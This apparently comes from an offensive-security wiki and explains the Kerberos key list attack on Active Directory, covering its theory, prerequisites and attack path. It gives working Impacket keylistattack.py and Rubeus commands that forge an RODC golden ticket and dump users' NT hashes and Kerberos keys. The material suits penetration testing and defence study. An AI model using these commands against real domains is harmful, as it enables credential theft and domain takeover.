## Theory
It is possible to retrieve the long term secret of a user (e.g. NT hash) by sending a `TGS-REQ` (service ticket request) to the KRBTGT service with a `KERB-KEY-LIST-REQ` message type. This was introduced initially to support SSO with legacy protocols (e.g. NTLM) with Azure AD on on-premises resources.

An attacker can abuse this by forging a RODC golden ticket for a target user and use it to send a `TGS-REQ` to the KRBTGT service with a padata filed value of 161 (`KERB-KEY-LIST-REQ`). Knowing the KRBTGT key of the RODC is required here. The TGS-REP will contain the long term secret of the user in the `KERB-KEY-LIST-REP` key value.
### Usecase
This feature was legitimately introduced to support legacy authentication protocols (like NTLM or digest auth) in hybrid environments, where:

- Azure AD syncs with on-prem AD.
- Clients may not have access to the DC but still need secrets to authenticate locally.

So, a domain controller can provide a user’s secret keys to trusted services (e.g., an RODC) through a KERB-KEY-LIST-REQ message.
!!! note "Prerequisites"
    - Attacker compromises the KRBTGT account password hash of a Read-Only Domain Controller (RODC).
    - Attacker knows the target user's username (e.g., a domain admin).
### Attack path
- Forge a Golden Ticket using the `RODC’s KRBTGT` hash — this impersonates the RODC.

- Set the `ticket’s ServiceName` to "krbtgt" (requesting a TGS for the TGT service).

- Set the `padata` field to type 161 (`KERB-KEY-LIST-REQ`).

- Send `TGS-REQ` to the KDC (using forged RODC ticket).

- You are now acting as the RODC, asking for the user’s key material.

- Receive TGS-REP, which includes:

    - KERB-KEY-LIST-REP: Contains the target user's long-term secret keys, including:

        - NT hash

        - Kerberos keys (AES128, AES256, etc.)

## Exploit
=== "UNIX-like"
    From UNIX-like systems, the Impacket's [keylistattack.py](https://github.com/fortra/impacket/blob/master/examples/keylistattack.py) tool (Python) can be used for this purpose.
    ```bash
    #Attempt to dump all the users' hashes even the ones in the Denied list
    #Low privileged credentials are needed in the command for the SAMR enumeration
    keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -full "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"

    #Attempt to dump all the users' hashes but filter the ones in the Denied list
    #Low privileged credentials are needed in the command for the SAMR enumeration
    keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"

    #Attempt to dump a specific user's hash
    keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -t "$TARGETUSER" -kdc "$RODC_FQDN" LIST
    ```
=== "Windows"
    From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for this purpose.
    ```bash
    # 1. Forge a RODC Golden ticket
    Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID

    # 2. Request a TGT via TGS-REQ request and retrieve the NT hash of the user in the response
    Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/domain.local
    ```